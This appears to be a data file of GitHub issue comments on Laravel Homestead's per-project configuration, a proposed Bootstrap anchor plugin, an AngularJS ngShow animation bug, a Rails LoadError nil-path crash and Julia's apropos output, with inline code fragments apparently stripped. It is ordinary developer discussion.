framework/laravel/6531/65528369,6531,"@friend That would be an improvement over the status quo, but not really go far enough to be too useful. How many settings can you really put into ? I mean, all of them benefit from being project-specific, but are less important settings that be maintained by all developers across a project (though I advocate they absolutely still be shared settings). At a minimum,  and  also need to be able to be project-specific, but this would be much cleaner if these two extra script files [had been implemented as part of Homestead.yamlHomestead.rbVagrantfile~/.homestead/Homestead.yamlhomestead upHomestead.yamlafter.shaliases` if they exist. That would be much closer to a more flexible system that could still work the way it currently does if users want that (though personally I'm not a fan of recommending developers use a shared host model at all). ",,False
framework/laravel/6531/65725076,6531,"@friend @friend most people using homestead don't need all of the customisability of vagrant, they just go  and everything works for them I think homestead is targeted to people who may be a bit scared of the command line and prefer to work with things that they can see if you want to run a application per vm then I think you should be using just normal vagrant this is where is was trying to go with my changes now to configure homestead you will just edit the  in the project directory and not have to find it in a hidden folder or run a console command and I was going to add a way for homestead to add that project file path by its self  maybe with  and then it will add the current working directory to the  array and look for a  in that directory for the settings used by that project ",,False
framework/laravel/6531/65727548,6531,maybe even if homestead included the laravel installer so that running  it could install a new version of laravel and then add it to homestead automatically ,,False
framework/laravel/6531/65821295,6531,"Using words like ""most"" is ill-advised, as you have no way of knowing that. However, my main issue isn't that these changes to Homestead occurred at all, it's that they occurred in a way to make it unusable for those who do need more flexibility. Your proposed changes will help, but don't offer enough flexibility. Purestead does, but is a complete fork and therefore I'm not sure the benefit. I'll probably get around to extending Homestead using proper Vagrant inheritance... ",,False
framework/laravel/6531/66770097,6531,"@friend, I totally agree with you. The way homestead is going on is making it more difficult to share customized projects with a team. Will be much better if it follow the vagrant approach or as you say adds more flexibility of configurations per project. ",,False
framework/laravel/6531/66997422,6531,"Definitely agree with this. I've got many clients and many different projects; the beauty of Vagrant is being able to share those development configurations with the team, and to limit the impact of one environment on another. With Homestead 2 those key benefits no longer exist -/ Purestead looks like it might be a better option for now. First I've seen of that; will be trying it out. ",,False
framework/laravel/6531/68175936,6531,"plus one Homestead seems to drift away from the core Vagrant principal of discreet project server environments, for reasons I'm yet to understand. ",,False
framework/laravel/6531/68546780,6531,"plus one Agree with this. It's a nice idea, but it would be great to have the option to use Homestead as a standalone vagrant project as well. ",,False
framework/laravel/6531/69490083,6531,"I agree with this as well. It would be great to have a .homestead.yml file per project. It could work like Vagrant does.  would create a homestead.yml in your project root folder (similar to  ) instead of using a global file. For now, I am using only the homestead box directly with vagrant. ",,False
framework/laravel/6531/74538256,6531,Project specific Homestead environments are absolutely critical for our workflow. We will quite simply not be able to utilise Homestead as it stands at present. ,,False
framework/laravel/6531/76507655,6531,So question  if you want homestead to work like vagrant why don't you just use vagrant? ,,False
framework/laravel/6531/76508530,6531,The last commit on  was today so it is being worked on and it uses the same Box that Homestead does so it is the exact same software stack ,,False
framework/laravel/6531/76722008,6531,"i think, the discussion ""if you want homestead to work like vagrant, than use vagrant"" leads to nowhere. An example? Laravel (git)ignores the vendor dir per default but the default vm for laravel gives us no direct automatism to install the vendor dir?! Every team - my team, team of @friend, etc. - needs to implement provisioning additionally for getting even the minimum of loading the vendor dir. ",,False
framework/laravel/6531/76723257,6531,"@friend I find your ""I work this way, and so should you, or go elsewhere"" attitude to this issue unconstructive and opinionated. ""Use another product"" is not an appropriate response to this issue.  Because the product fits your needs does not make it appropriate for everyone, especially when the issue is with functionality which has been removed. ",,False
framework/laravel/6531/76730566,6531,"I've experimented lot's of frameworks since ruby on rails first came out, maybe 10 years ago from today, and what I like and amazed about laravel is there's a decent answer to virtually any common problem (which is the definition of a framework), without sacrificing flexibility and with great documentation. Homestead is a good utility for building up the dev. environment but it sacrifices some flexibility this time and I believe this is a very common case. Yes you can always set your own vagrant box or use an alternative but that's what we do with zend framework or symfony or any other popular framework, isn't it? ",,False
framework/laravel/6531/76757012,6531,I agree it's a missing feature. Vagrant supports multiple VMs per environment. Maybe this can somehow be used to allow for per-project VMs? ,,False
framework/laravel/6531/76875325,6531,"I'm not saying you cant use homestead I'm working in a group of 3, so homestead wouldn't work for us because if one person makes a change  like installs Mongo how do you handle that?? homestead as it is, does not handle stuff like this, so I made some changes to homestead and just copy them into the root of my project you can see my changes at  is more customisable and all configuration is now in the repo if you want mongodb on your vm just write a create-mongo.sh in the scripts and change homestead.rb to run it I have no idea who you would get homestead to do this ",,False
framework/laravel/6531/76904261,6531,"@friend You got the provisioning script in your project, which everyone uses? I don't understand, how you point invalidates provisioning per project for homestead? ",,False
framework/laravel/6531/77062073,6531,I think the best you could get homestead to do is copy the files into you project for you and maybe be a wrapper around vagrant to tell you when you may need to provision again I would not be opposed to homestead being able to do that but it should be to do this as well as have it's original functionality ♠homestead init --localHomestead.yamlVagrantfilelocal mode` where is just runs vagrant in the current directory but if it doesn't find one of those files it runs it in the global version that would be cool but now this is just how vagrant works but with some sugar ,,False
framework/laravel/6531/77358725,6531,"""just how vagrant works but with some sugar"" sounds perfectly fine to me. Homestead was (prior to version 2) essentially a Laravel-ready Vagrant configuration with some helpful wrappers around configuration and cli commands. There's nothing wrong with that; it was very useful. I've been happily using Purestead on recent projects anyway, so this isn't a massive issue for me (i.e. alternatives are available). I'm just not aware of a good argument for this change to a ""global Homestead"" in version 2. It's a lot of extra steps now to get my team on the same environment, and I don't see what's been gained. ",,False
framework/laravel/6531/77393530,6531,You can also still use Homestead 1. ,,False
framework/laravel/6531/77474450,6531,@friend I will have to find a source for this but the goal with Homestead was to have a way to quickly set up a new laravel site in vagrant and making a new box in vagrant is slow so put them all in the same box I think homestead is good for personal projects and tests eg trying out a new package or trying out a new concept I think @friend mentioned this in the lavavel podcast ep 19 but I could be wrong I will listen to it again and find out after work ,,False
framework/laravel/6531/78451141,6531,If you want to have a look at how i think local installs of homestead could work have a look at laravel/homestead#173 just an idea discuss ,,False
framework/laravel/6531/78791235,6531,"I have been using a customized version of homestead after version 2 because of this issue, today this issue came to my attemption and made me figure other people shares this same opinion, so i open sourced my customized version  is basically homestead, no customizations at all, only simplified and per project based. ",,False
framework/laravel/6531/87071858,6531,"I think this global homestead is a step backwards, it makes it really hard to commit the dev environment to source control and for other devs to simply vagrant up and get cracking. Plus the provisioning script is running for every homestead up? Each project has it's own provisioning requirements.... ",,False
framework/laravel/6531/89870626,6531,"Have to agree here, it seems a bit backwards. If we could add something similar to what @friend said above (check project folder first, then user folder) then that would be awesome. ",,False
framework/laravel/6531/89948168,6531,I tried to talk to Taylor about it and he said that he though Homestead was ok as it is so if we want a feature like this we will have to fork  but there is already projects around that do this eg purestead and firestead I also don't think another homestead fork is a good idea  ,,False
framework/laravel/6531/90085969,6531,Sucks to hear that disappointed ,,False
framework/laravel/6531/90125897,6531,"so, no original homestead in bigger teams with multiple homestead projects for me ... -1 ",,False
framework/laravel/6531/90127626,6531,"I feel bad about this too, but there is no way to please everyone... I don't know if the majority liked this new way, but seems to, as it's simpler... That's why forks exists, someone doesn't like the direction of the main project and fork and customize. We have two good alternatives, as @friend pointed, purestead and firestead, i haven't tested purestead but seems pretty good to me. ",,False
framework/laravel/6531/90160640,6531,"plus one I agree with many of the opinions stated in this thread. I love Homestead. I think it has been a great project but with Homestead 2, the added  directory has caused more problems than solutions for me. I don't really like having Homestead in 2 different directories either. I have started opting for other solutions but would prefer to stick with Homestead if possible. ",,False
framework/laravel/6531/120120603,6531,ping @friend this is already achieved so probably you can close this. ,,False
framework/laravel/6531/120129192,6531,Thanks @friend. ,,False
bootstrap/twbs/16248/66845883,16248,"Hello all. I'd first like to preface this with a little about myself. I am the primary maintainer for the Drupal Bootstrap base-theme. It currently has over 60k installs, so needless to say we get a lot of our own issues. Recently, I started the task of trying to tackle better anchor and scrolling support in the base-theme. Support for anchors or scrolling to them has always been a big pain, for not only me, but also a lot of others; especially when dealing with fixed navbars [jsbin]. The code I currently have in the project was rather hack-ish and completely un-configurable (my feeble attempt to satisfy a growing issue), so I set out to tackle this once and for all [ I've poured over countless blogs, docs, support forums and even found a few in this project's issue queue [#193, #1768, #11854]. The ""solutions"" vary from CSS to JS, but more often than not require at least some sort of manual configuration for it to work with that specific theme/offset requirement. Ultimately though, I've determined that a CSS-only solution just doesn't really cut it; especially when dealing with dynamic and varying content as such in CMS framework like Drupal. So, I've created the following JS based plugin instead  [demo/docs] In an effort to offset the ""cost"" for using JS, I was also inspired with the recent addition using anchor.js for Bootstrap's own documentation (#14897, #15491). This got me to thinking how this could easily be expanded from Bootstrap's own Tooltip plugin, like Popovers are. What makes it even more enticing is that there has been a  available to use for quite a while. Since both Tooltips and Popovers are completely opt-in with no data API support, it made sense to follow in that direction; especially for those who still want/need a CSS-only solution. My ultimate goal/desire is to merge this upstream into Bootstrap directly. I'm sure this will be a daunting task which is why I'm creating this issue now to get some feedback and eyes on this plugin so it can be flushed out a bit more. I'm still working on documentation of all the new options, so bare that in mind. I look forward to y'alls feedback! ",,False
bootstrap/twbs/16248/90496139,16248,"Hi @friend! You appear to have posted a live example ( which is always a good first step. However, according to the HTML5 validator, your example has some validation errors, which might potentially be causing your issue  line 99, column 23 A  meta ♠` element found after the first 512 bytes.  You'll need to fix these errors and post a revised example before we can proceed further. Thanks! (Please note that this is a fully automated comment.) ",,False
bootstrap/twbs/16248/90788568,16248,"I personally doubt the Core Team would be interested in getting into the same business as Anchor.js when Anchor.js itself already does a fine job. As for #1768 &amp; friends, you might have more traction on that front, although we're fairly reluctant to add more jQuery plugins at this point. I too wish there was a good solution to that bug though. ",,False
bootstrap/twbs/16248/90794821,16248,"Except that Anchor.js isn't bundled with Bootstrap. This is about providing and out-of-the-box native Bootstrap plugin... not relying on yet another 3rd party external library that people will have to download, install and configure in addition to. That's certainly debatable. It's lightweight and works well for simple sites, sure, but also at the cost of being easily configurable in case complexities arise. It doesn't use a template for inserting existing markup that a framework (like Bootstrap) already has available and the only way to replace the ""icon"" is to override/replace the CSS it provides. It's ID generation logic could also use some work. I'm really not trying to knock it, in fact it was in part responsible for the discovery process that led to this plugin. It certainly has it's use cases, but I wouldn't have built what I did if it did a ""good"" enough job. I would like to make it clear that this plugin is a pure extension on top of the existing Bootstrap tooltip plugin. It is and was not an Anchor.js rip-off, just inspired by it as well as Bootstrap's existing Tooltip plugin. I think you're missing the point of the plugin. It's goal is to really tie two concepts together anchors and links to anchors (anchor links). By doing so, they're aware of each other and can work together in harmony to provide a more cohesive anchor/scrolling solution. Sure. I'm not suggesting that this should be in the next release. It's currently not, by any means, ""production"" ready. In fact, I imagined that it would be BS4 in all reality (with the separate repo for BS3 support/prototyping). Like I said above, I opened this issue for exposure and to get viable feedback. I was hoping to have more of a positive feedback and to move forward rather than defending a solution to a problem that has been quite evident for quite some time now. I'm certainly open to suggestions, improvements and even changing some fundamental aspects about the plugin, it's not set in stone. I urge people to seriously consider this proposal rather than simply dismissing it outright because of ""simpler"" existing plugins. ",,False
bootstrap/twbs/16248/90811676,16248,"Just speaking generally There is a limit to what we can bundle, both due to the amount of effort required (e.g. I'm doubtful that Bootstrap itself will ever include a datepicker; they're just too damn complex and we already have our work cut out for us just maintaining the existing widgets) and due to fears of bloat (which we're already occasionally accused of with just our current set of widgets). And the trend these days is towards smaller modular packages rather than kitchen sinks. Actually, one of the hopes for Bootstrap v3 was to strengthen the third-party plugin ecosystem and thus lessen the pressure for new plugins in core Bootstrap, but unfortunately not much happened on that front. Anyway, I'll be interested to see what the rest of the team says about the proposal. ",,False
bootstrap/twbs/16248/90818307,16248,"I'm rather curious as to the hesitation. Have you even looked at the code and demo yet? I've already done most of the ground work...  agree, but this isn't about just adding a arbitrary feature, it's also a solution to an issue that this framework introduces in the first place by providing a fixed navbar. It's kind of like saying ""Here's a nifty feature for navigation, but don't mind that your anchors may behave a bit oddly at times. Will we fix it, no... there's a few hacks around the interwebs, do some research."" I will gladly accept sole responsibility for maintaining this specific plugin it if it were ever to come to that. Somehow though, I doubt that will happen considering it's already built upon and in the same format as the Tooltip plugin. Yes, I would be too. ",,False
bootstrap/twbs/16248/90958237,16248,"@friend A few things It's interesting to me that you get a lot of requests for the feature in your Drupal theme. Forgive me, but it's been quite some time since I touched PHP or any CMS but is that a common sort of feature in Drupal themes? I haven't seen it come up too often in Bootstrap's IRC channel or elsewhere, so it's interesting to me that it'd be a requested feature elsewhere. I'd also be interested if it's the sort of plugin other theme developers might want to use. Secondly, this is a bit unfair The docs note that using fixed navbars requires some padding adjustments. While that doesn't cover every combination of components and HTML on a page (a fixed navbar and anchors to IDs in this specific instance). Solving that problem is usually done simply with an offset on the click. Bootstrap-anchor does much more than solve that one issue, though, which brings me to my third thing. Adding features, especially full-fledged plugins, need to be evaluated in terms of long-term maintenance costs (it's great that you're offering to support it, but it's also no guarantee, unfortunately), added complexity (you'll be surprised by how authors use Bootstrap in unexpected ways) and package costs (like @friend pointed out, Bootstrap already gets flack for being heavy in many ways). Anyway, I'm not saying -1 yet but I'm not sold yet on why this should be a core plugin and not a community plugin. ",,False
bootstrap/twbs/16248/91020406,16248,"I wouldn't say it's ""common"" per se, but it certainly more of a prevalent issue when Drupal modules like the Administration Menu add their own fixed nav and increases the  margin (not padding) on top of a user who has opted to use the Bootstrap fixed navbar that adds  padding; it can get rather complicated and nasty very quickly. I think that's because people who are in the business of starting with Bootstrap directly (i.e. reading the docs, in the IRC channel) are generally themers/site builders or at the very least able to understand that there will be a minimal amount of effort in configuring their ""theme"". The Drupal Bootstrap base-theme's sole purpose is to bridge that gap between the dynamic aspect of Drupal and the Bootstrap framework. One of the main reasons this base-theme has risen to become very popular (currently third top Drupal theme) in such a short amount of time is because it allows non-themers to configure their Bootstrap theme in an easy to use administrative UI. I understand that I come from a unique perspective and it's partially a unique issue to us. Users choose Drupal Bootstrap because the framework is popular. The don't always choose it because they know the little intricacies/issues that come with choosing their fixed navbar type from the UI  These types of users are not always skilled CSS/JS ninjas, so when they see that there's an issue with their anchor's ""Solving that problem is usually done simply with an offset on the click"" is really not always as ""simple"" as it sounds. Which is why I've been working on a way to assist with/fix this problem. Yes, I understand and acknowledged this fact up front as one of the reasons for offsetting the ""cost"" of using a JS based solution to the scrolling issue by expanding upon Bootstrap's Tooltip plugin with anchor links. Also, again, it goes further than just ""adding in another feature"" really. The two work in together in harmony. By building the plugin with the concept of ""anchors"" and ""anchor links"", it allows for a more cohesive UX in addressing ""What happens when I click an anchor on this page?"". I do find it a little ironic though that even the docs suddenly had a need for them, but there wasn't anything native in Bootstrap to do it so a third party plugin was used instead. I really do understand all of this and agree with it, believe me, I do. I'm not suggesting this plugin is just thrown in willy nilly without any sort of evaluation, game plan or what have you. I think the real purpose of why I opened this issue in the first place is really being lost here. I'm not saying it can't be either. I opened this issue to get evaluation and feedback on the plugin itself, not quarrel over semantics. Yes, I said it was my goal/desire to ultimately make this a core plugin, but who knows, maybe that won't be the case and I'll just keep it as a separate contrib plugin. That is certainly fine by me. All I was looking for really was ""Wow that's cool... let's work on making it better! Maybe it's something that does have merit to pull into core.""... you know FOSS, not getting smacked down for having an idea on how to fix a very real issue. I'm honestly half tempted to just close this issue and just continue developing it as a contrib plugin if this is going to be the attitude moving forward frowning ",,False
bootstrap/twbs/16248/92155500,16248,"Your plugin looks and feels awesome in my super quick tests, so props on that front. I'll try to address as much of your post and the replies here as I can. Development approach Tooltips and popovers are opt-in do to performance issues with detecting , , etc on every DOM element. Good call here, that does indeed make sense. Your goal and feedback Right on, a bold endeavor to say the least ). I think @friend, as a core team member, covered the generalities quite well, though I think you've mistaken some of his comments as overly dismissive. He's outlined that  We're reluctant to add new JavaScript. Expanding on that, we're not adding any new features to v3. It's a call we made to avoid having to rewrite even more for v4. We've got Anchor.js in there right now and it's solving the problem it was meant to solve—linking to specific sections of content—quite well. There's a balance to what we can do with the size of the team we have. We build things we think folks would like to use, as well as things we ourselves want to build and maintain.  You didn't get any real feedback on your own plugin, but that's not really something we're here to provide unfortunately. At least, not in a structured or timely way that would be of much use to yourself. Looking at the demo and docs though, it seems to work quite well and is a decently structured and focused plugin. All around, it seems great. Fixed navbars Yes, we've got fixed navbars and yes there's the problem of overlapping content. I'd prefer we didn't add more JavaScript to address that, but I understand folks also don't want to have to address these kind of things themselves. I'm torn on how far to go there, and because of that, we likely won't try to address it ourselves. I'd like us to continue to err on the side of caution for this kind of stuff. Maintenance You've offered to maintain it, but that's not enough. Putting it in the main repo means committing to it and supporting it as a team. Bug reports, further feature development, and documentation all come into play there. I'm not saying you wouldn't be up to it, but we might not be. That's not meant to be dick-ish, it's just matter-of-fact. On feedback No one has smacked you down. One team contributor and one community member voiced their opinions. Their questions and comments are just as valid as your own. While you've very clearly asked for feedback, you also very clearly stated you'd like this to be part of the core project. Two folks have focused on the latter while reviewing this thread.  Lastly, shifting gears back to the plugin itself, it's a damned fine plugin. I'd like to see it continue as a community project as I don't think it's something we'd like to see addressed with Bootstrap. Yes, the fixed navbar introduces a potential need for this. However, that's not unique to our navbars—damned near every component likely introduces a potential need for n number of edge cases, extensions, etc. Please do continue to develop and share it with folks, but it won't be part of Bootstrap's core (not in v3 or v4, not at this point at least). Please also continue to use this thread to gather feedback from folks if you wish. I'd love if more of our team chimed in, but we're all on different schedules and what not. Hope that helps some. &lt;3 ",,False
angular.js/angular/4401/20935765,4401,"ngShowDirective watches attr.ngShow, and adds ng-hide-remove class even when the attr.ngShow value ""changes"" from true to true (or from false to false). Animations should only be applied if the actual value of ng-hide has changed if ( toBoolean(value) !== toBoolean(oldValue) ) {   $animatetoBoolean(value) ? 'removeClass'  'addClass'; } ",,False
angular.js/angular/4401/26236153,4401,I can't reproduce the problem here  - Can you modify the Plunker to demonstrate the issue? ,,False
angular.js/angular/4401/26301736,4401,"Thanks, @friend.  Great idea! This reveals the issue, when you type in the new text field I added.  ",,False
angular.js/angular/4401/26301862,4401,P.S. I'd be happy and honoured to submit a pull request for this issue if you like -) ,,False
angular.js/angular/4401/26303594,4401,"Hmm... actually, my naïve solution doesn't work - the ng-show directive wouldn't initially add the ng-hide class (since value and oldvalue are both ""undefined"" at the start, so the boolean value doesn't look like it's ""changed"".  Needs more thought... ",,False
angular.js/angular/4401/26390790,4401,@friend how's this coming? I can make a quick PR towards the end of the week unless you're still on this. ,,False
angular.js/angular/4401/26393110,4401,"I'm a bit stuck, to tell you the truth. My fix (above) only works for ngHideDirective, and that's only because of an accident - namely that if the initial toBoolean(oldValue) is false, this matches the fact that we haven't yet added or removed either of the ng-hide-add and ng-hide-remove classes; hence doing nothing is appropriate. The ngShowDirective is more complicated.  If value and oldValue are both initially ""undefined"" or falsy, we must take action to add ng-hide, even though it doesn't seem like the model has changed.  Otherwise '''&lt;span ng-show=""undefinedValue""&gt;''' will fail to be hidden at start up. Is there a way to tell if this is the first time the $watch() function has been called?  Then we could do this ''' var ngShowDirective = ['$animate', function($animate) {   return function(scope, element, attr) {     scope.$watch(attr.ngShow, function ngShowWatchAction(value, oldValue){       if ( isFirstTimeThisWatchHasFired || (toBoolean(value) !== toBoolean(oldValue)) ) {         $animatetoBoolean(value) ? 'removeClass'  'addClass';       }     });   }; }]; ''' Any ideas? ",,False
angular.js/angular/4401/26473531,4401,You could try to define a variable outside of the watch and check if it is true. Also take a look at $compile to see if you setup the addClass/removeClass guard there ,,False
angular.js/angular/4401/26474600,4401,"Thanks @friend! I'm embarrassed that the solution is so obvious -)  I added the local variable, and it now works as I'd expect.  I'll send a pull request ASAP.  Not sure how to add tests for this feature though.  Any advice? ",,False
angular.js/angular/4401/26477089,4401,"A good place to start is with  Just add another speak and try to use the mocking system that the two existing tests are using. To run tests, do the following  npm install ./node_modules/.bin/bower install grunt autotest  Then when everything is passing and your code is ready to go, try the following  grunt test  After that change your commit message style to follow AngularJS' style Take a look at some of the commits here ",,False
angular.js/angular/4401/26822122,4401,@friend how's this coming along? Do you need me to help out in any way? ,,False
angular.js/angular/4401/26852813,4401,"Hi @friend. I've sent pull request #4479, and I think I've formatted it correctly now (my first ever pull request - very exciting stuff!) I just had a brief holiday in Sydney, so haven't had a chance to write the tests.  Also, I've never written unit tests in the framework used in Angular.  I'd be keen to try, and from the looks of things, this is a fairly simple example to get started on. I've been reading up on how to test code like this, and it's a great way to get deeper into how Angular works, so if there's no rush to get this fixed, I'd be happy to tackle the tests.  I've got a huge stack of work to catch up on, though, so it won't happen this week.  If you have the time and the inclination to write the tests, I'd be happy to learn from your example - I'll use the lesson to fix something else in the Angular code base -) ",,False
angular.js/angular/4401/26898160,4401,@friend no problem. I can handle the tests. I'm trying to close just about all the animation PRs before 1.2 is released. ,,False
angular.js/angular/4401/26944525,4401,"@friend great work for fixing this with ngShow/ngHide. Turns out that after looking more into the problem, $animate is causing the issue and the CSS class checking has to occur inside of it. So the solution has to fix it for all cases. The ngShow/ngHide PR you made only works for that one ($animate.addClass / removeClass was had this issue to begin with). Here's the new PR  a working version of your demo with the new PR  for closing your PR on this. Thank you for putting the work into it. ",,False
angular.js/angular/4401/26949336,4401,"Thanks Matias -) Interesting.  My first thought was to check hasClass(), but that felt DOM-centric and implementation-specific.  I was afraid I was falling into my old jQuery habits (storing ""model"" in DOM) -)  That's not a criticism; I think the area that you've amended is at the same level of abstraction as the fix you've added.  It felt awkward to add class-level checks inside the ngShowHide.js file though. I like how simple the general solution is now. Thanks so much for your help and encouragement with this - I've really enjoyed the experience.  It's my first contribution to OSS, and thanks to you and your kind and helpful attitude, I'm definitely going to do more! Grant On 24/10/2013, at 954 AM, Matias Niemelä notifications@friend.com wrote ",,False
angular.js/angular/4401/27033469,4401,@friend happy to hear that the fix is good. And thanks for the feedback about the OSS stuff. I'm happy to help. Keep contributing! You learn a lot when working on an open-source project. ,,False
angular.js/angular/4401/27033692,4401,Landed as ,,False
rails/rails/29632/239576557,29632,"It's possible for  to be  when a mixin included in  is misnamed, resulting in a crash on boot with a none-too-useful error Full stack trace here  to reproduce I have several chunks of application-wide helper functionality split out into mixins like They are included in  Everything works fine when the names are correct, but when they aren't - say  includes  by accident - I get a crash on boot with the above stack trace. It's worth noting that i'm using inflections to define a  acronym, though when messing around it doesn't seem to make a difference. There are actually two  calls on the line in question  I hacked a  in there and confirmed that it's  that is . Expected behavior The error message should reflect the problem - missing module, bad file name, etc. Actual behavior The  method itself errors, raising a  that does little to indicate the underlying problem. System configuration Rails version 5.1.1 Ruby version 2.3.4 ",,False
rails/rails/29632/312434005,29632,"I tried to look at this bug, but I was not able to reproduce. Could you post a code that would reproduce the bug? ",,False
rails/rails/29632/312663180,29632,"@friend, I also tried to reproduce but I was not able like @friend , meaning that I see a different error output. I created a new app adding just the css_helper.rb file and including it in application_helper.rb and when i boot in production env i get the following error message that seems quite useful from /Apps/issue-29632/app/helpers/application_helper.rb1in &lt;top (required)&gt;' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb12in block in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/concurrency/share_lock.rb149in exclusive' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb11in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb150in block in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in map!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/action_controller/metal/helpers.rb93in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb109in helper' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb187in default_helper_module!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in block in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in class_eval' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionview-5.1.1/lib/action_view/layouts.rb217in inherited'  Btw, if I include HelperMixinsCSSHelper in application_helper.rb i get another error because it is searching for CssHelper instead `rescue in block in modules_for_helpers' Couldn't find HelperMixinsCssHelper, expected it to be defined in helpers/helper_mixins/css_helper.rb (NameError) I will investigate more on this to understand if it is actually a bug or not. ",,False
rails/rails/29632/313040397,29632,"Yes, the underlying issue is that the helper is misnamed. Easy to fix. The problem this issue is addressing is that - one way or another - it is possible for to enter the  function for a  that has  of , causing the sub' for nilNilClass (NoMethodError)LoadError#is_missing?LoadError#pathnilLoadError#path#subString` or whatever) before telling it to. ",,False
rails/rails/29632/313084335,29632,"Yes, please do PR. While modern rubies won't internally raise a LoadError without a , it wasn't that long ago that it was normal, so it seems reasonable for us to accomodate 3rd party libraries that haven't caught up with the times. (Though correspondingly, we shouldn't be generating such half-formed exceptions.) I don't think it should raise, though just return false. This method is already here for us to attempt to friendlify an error message; if the  is missing, the safest choice would seem to be to assume it's not the error we're looking for, and let it proceed as is. It'd also probably be worthwhile identifying which library is seemingly interfering, to help them modernize.. but as you say, handling it on our side is independent of that. ",,False
rails/rails/29632/317820557,29632,"Even just sticking a  in there seems fine. Either way this should be a very small change, just needs a test. @friend Were you interested in opening a PR for this? ",,False
rails/rails/29632/318024069,29632,"Sorry, hadn't had the time because i was thinking I'd have to set up a whole local dev env to do the change and test it, but it's so small and I figured you guys probably have some sort of CI anyways so I just did it in the web UI. ",,False
rails/rails/29632/320246411,29632,"@friend we do have a CI but there isn't a test testing the case you changed, i.e. the case where a load path is nil. We can't accept a change without a test because then someone can come along and say the same thing ""just a small change, the suite passes, remove the "" and then your case will be broken again. The test is prevent regressions, not because we think this change is too dangerous. ",,False
rails/rails/29632/320352486,29632,"@friend nah I totally get it, I just don't have a dev env set up for Rails and I figured that was gonna take a decent amount of time... I've been in serious crunch mode trying to ship something. But I just looked at the dev setup instructions and it looks really simple so I'll give it an hour right now and see where get. ",,False
rails/rails/29632/320356754,29632,@friend is there a Docker image for the dev env? I'm wary to install Virtual Box because I know it's had conflicts with Docker in the past and I really can't break my work env right now. ,,False
rails/rails/29632/320361267,29632,"If you're on a mac I recommend doing it ""the hard way"" which really isn't that time consuming. You can probably skip setting up active record so as long as you have a supported Ruby installation shouldn't be much more involved than starting a rails app. We don't have a docker image that I'm aware of. I totally understand if you don't have time to work on the issue. Open source is time consuming! I wanted to explain why we can't merge the PR as is 😀 If you run into an issue setting up locally let me know ",,False
rails/rails/29632/341607799,29632,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False
julia/JuliaLang/12989/105118611,12989,"Currently, apropos' output is quite simple — it's just the objects whose docstrings match the search text It might be nice to make this display a bit richer. We could additionally print out the first non-code documentation line to the edge of the screen, e.g., It also might be nice to make it return a Julia type that simply contains an array of objects and their documentation, so IJulia and other non-REPL programs can format it a little nicer or linkify the text for full documentation.  This does have the downside of making the display non-incremental, making it feel a little slower, but it may be worth it. The implementation is also quite simple and should be fairly simple to extend. ",,False
julia/JuliaLang/12989/138351688,12989,"I'd like to take this up. Some questions/remarks Currently, in 0.3, apropos(""pearson"") prints this while in 0.4, apropos seems to have been removed entirely. What are the most important functions and files I will need to read / modify, and which branch should I work in? ",,False
julia/JuliaLang/12989/138358530,12989,@friend you'll have to update.  was very recently reintroduced. ,,False
julia/JuliaLang/12989/138359214,12989,"@friend Oh, I was on a 7 days old master. Updating now - thanks! ",,False
julia/JuliaLang/12989/151637987,12989,"I agree that enriching the  by providing a good indication as to what the found objects are/do is desirable.  However, after studying and playing with Docs.jl and company, I'm concerned that addressing this issue might be easier said than done, possibly leading to confusing or misleading results The Good  and the new Documentation facilities strike me as extremely well designed, providing a solid foundation for development.   nicely sifts through (loaded) module's  information for matches to its target.  It has available both the keys (objects) and values (object documentation) of these matches but, currently ""merely"" prints the keys.  So the information needed to implement this improvement is right where it needs to be, which seems pretty good. The Complicated  There is almost an embarrassment of riches in the object documentation available to  (but currently unused).  It is difficult to know how to consistently extract an appropriate summary from the available information. Looking at the object documentation for  and  in , @friend 's suggestion is quite reasonable.  Just dig through the object documentation,  select the right Markdown structure and (if needed) truncate it for brevity. However the situation may be different in the future.  Looking at a recent version of Master So it looks as if the documentation for objects (generic functions in particular) may be getting rewritten to better fit with the new documentation system, with an emphasis on providing information on how to use representative methods of generic functions rather than on providing generic documentation of the function.  A naive implementation of the improvement to apropos might look good in the current release but show, rather unhelpfully, in a recent Master I suppose that one approach would be to look through the object documentation to print the text in the vicinity of (one of) the matches to the  search target. Any suggestions on how to proceed?  Do we need to rethink this improvement in the light of how Julia object documentation appears to be developing?  Does it make sense to leave  be (it is simple, robust and effective) and consider developing a different tool for more in-depth exploration and presentation of Julia objects?  A feature rich apropos-like tool that (optionally) works across all installed/registered modules could be quite cool, but that might be best developed as a module. ",,False
julia/JuliaLang/12989/152782477,12989,"Since my last comment, I've learned a bit more about the structure of object documentation and now feel that enhancing  will be easier than I had thought.  This change of attitude comes with the realization that generic function documentation is ordered in a reasonable way, making it easy to identify the most generic definition of a function.  (Confusingly to me, the doc macro presents function definitions from more specific to less, which is what made my examination of the  documentation disheartening.) So I know how to easily retrieve the most generic definition of a function.  What's the hold-up to solving this issue and having a cooler  command?  It's truncating this definition, which is typically Markdown, for presentation.  I don't yet know how to do that.  Does anyone have any suggestions? ",,False
